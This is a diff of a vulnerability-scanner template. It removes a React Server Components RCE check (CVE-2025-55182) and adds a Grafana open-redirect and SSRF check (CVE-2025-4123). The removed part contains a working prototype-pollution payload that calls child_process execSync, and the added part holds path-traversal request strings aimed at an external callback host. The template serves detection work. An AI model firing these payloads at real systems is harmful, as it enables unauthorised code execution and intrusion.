@@ -1,58 +1,42 @@
-id: CVE-2025-55182-detection
+id: CVE-2025-4123
 
 info:
-  name: React Server Components RCE Detection (Flight Deserialization)
-  author: xai
-  severity: critical
-  description: Detects CVE-2025-55182 via crafted Flight chunk deserialization leading to potential RCE. Based on public PoC exploiting unsafe path traversal and gadget invocation.
-  reference:
-    - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
-    - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
-    - https://gist.github.com/HerringtonDarkholme/87f14efca45f7d38740be9f53849a89f
+  name: Grafana - XSS / Open Redirect / SSRF via Client Path Traversal
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: high
+  description: |
+    An open redirect vulnerability in Grafana can be chained with other issues, such as XSS or SSRF, to increase impact. An attacker may exploit the redirect to target internal services or deliver malicious JavaScript, potentially leading to internal data exposure or account takeover.
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
-    cve-id: CVE-2025-55182
-  tags: cve,cve2025,react,nextjs,rce,ssrf,deserialization,flight-protocol
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N
+    cvss-score: 7.6
+  reference:
+    - https://medium.com/@Nightbloodz/grafana-cve-2025-4123-full-read-ssrf-account-takeover-d12abd13cd53
+    - https://grafana.com/blog/2025/05/21/grafana-security-release-high-severity-security-fix-for-cve-2025-4123/
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: product:"Grafana"
+    fofa-query: app="Grafana"
+  tags: cve,cve2025,grafana,redirect,unauth,oss
 
 http:
-  - method: POST
-    path:
-      - "{{BaseURL}}"
-    headers:
-      Next-Action: x  # Triggers Server Action processing (arbitrary ID)
-    body: |
-      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
-      Content-Disposition: form-data; name="0"
+  - raw:
+      - |
+        GET /render/public/..%252f%255C{{interactsh-url}}%252f%253F%252f..%252f.. HTTP/1.1
+        Host: {{Hostname}}
 
-      { "then" : "$1:__proto__:then" , "status" : "resolved_model" , "reason" : -1 , "value" : "{ \"then\" : \"$B1337\" }" , "_response" :{ "_prefix" : "process.mainModule.require('child_process').execSync('echo vulnerable');" , "_formData" :{ "get" : "$1:constructor:constructor" }}}
-      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
-      Content-Disposition: form-data; name="1"
+      - |
+        GET /public/..%2F%5cbing.com%2F%3f%2F..%2F.. HTTP/1.1
+        Host: {{Hostname}}
 
-      "$@0"
-      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
-    matchers-condition: or
     matchers:
-      - type: status
-        status:
-          - -1  # Connection timeout/hang (common on success)
-          - 504  # Gateway timeout
-      - type: word
-        words:
-          - "Invalid chunk reference"  # Deserialization failure (patched)
-          - "ReactFlightReplyServer"  # Stack trace leak
-          - "getOutlinedModel"  # Internal func from write-up
-        part: body
-        condition: and
       - type: dsl
+        name: open-redirect
         dsl:
-          - "contains(body, 'prototype') && contains(body, 'constructor')"  # Pollution traces
-        condition: and
+          - status_code == 302 && contains(location, '/\\bing.com/?/../../')
 
-    extractors:
-      - type: regex
-        name: action_id
-        part: header
-        group: 1
-        regex:
-          - 'Next-Action: ([a-f0-9]{40})'  # Extract if present for chaining
+      - type: dsl
+        name: ssrf
+        dsl:
+          - contains(interactsh_protocol, 'dns') && contains(content_type, 'image/png')
+# digest: 490a0046304402205a8e33ec9fca86e4656f6d27ff90dd6ac9bfd490af62068bfe112ccbcd84ebb4022047a9c574fde65e8bfa366503a0dab3d8cbeee79872a3af026acc23a79df1d495:922c64590222798bb761d5b6d8e72950
